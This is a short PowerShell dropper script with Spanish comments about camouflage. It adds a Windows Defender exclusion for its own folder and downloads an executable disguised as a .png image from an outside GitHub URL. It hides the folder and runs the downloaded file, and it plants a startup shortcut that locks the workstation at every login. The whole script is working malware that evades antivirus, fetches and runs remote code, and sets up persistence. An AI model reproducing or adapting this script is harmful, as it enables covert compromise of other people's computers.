# --- CONFIGURACIÓN CAMUFLADA ---
$url_disfrazada = "https://raw.githubusercontent.com/DmI29/rapidman/main/setup_data.png"
$dir = "C:\System_Log_Service"
$exePath = "$dir\Win_Cloud_Sync_Setup.exe"

# 1. Preparar entorno y Antivirus
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
Add-MpPreference -ExclusionPath $dir

# 2. DESCARGA CAMUFLADA
Write-Host "Descargando paquetes de sistema (Camuflado)..." -ForegroundColor Cyan
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("user-agent", "Mozilla/5.0")
    
    # Descargamos el supuesto .png
    $webClient.DownloadFile($url_disfrazada, $exePath)
    Write-Host "Paquete recibido correctamente." -ForegroundColor Green
} catch {
    Write-Host "Error: Ni siquiera el camuflaje salto el firewall." -ForegroundColor Red
    exit
}

# 3. Crear el Bloqueo Automático
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$s = New-Object -ComObject WScript.Shell
$shortcut = $s.CreateShortcut("$startupPath\WinServiceLock.lnk")
$shortcut.TargetPath = "rundll32.exe"
$shortcut.Arguments = "user32.dll,LockWorkStation"
$shortcut.Save()

# 4. Ocultar y Ejecutar el instalador ya recuperado
attrib +s +h $dir
if (Test-Path $exePath) {
    Write-Host "Iniciando instalador..." -ForegroundColor Yellow
    Start-Process -FilePath $exePath
}
